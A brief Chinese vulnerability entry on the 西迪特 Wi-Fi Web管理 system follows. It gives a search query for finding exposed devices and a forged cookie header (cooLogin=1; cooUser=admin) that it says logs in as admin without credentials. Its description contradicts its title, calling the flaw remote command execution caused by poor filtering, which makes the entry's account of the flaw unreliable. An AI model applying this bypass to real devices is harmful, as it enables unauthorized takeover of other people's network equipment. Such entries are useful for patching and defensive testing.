# 西迪特 Wi-Fi Web管理 Cookie 越权访问漏洞

## 漏洞描述

西迪特 Wi-Fi Web管理系统后台过滤不足导致远程命令执行漏洞

## 漏洞影响

```
西迪特 Wi-Fi Web管理
```

## 网络测绘

```
title=="Wi-Fi Web管理"
```

## 漏洞复现o

登录页面

![image-20220519183944313](./images/202205191839372.png)

添加Cookie，即可登录后台

```
Cookie: timestamp=0; cooLogin=1; cooUser=admin
```
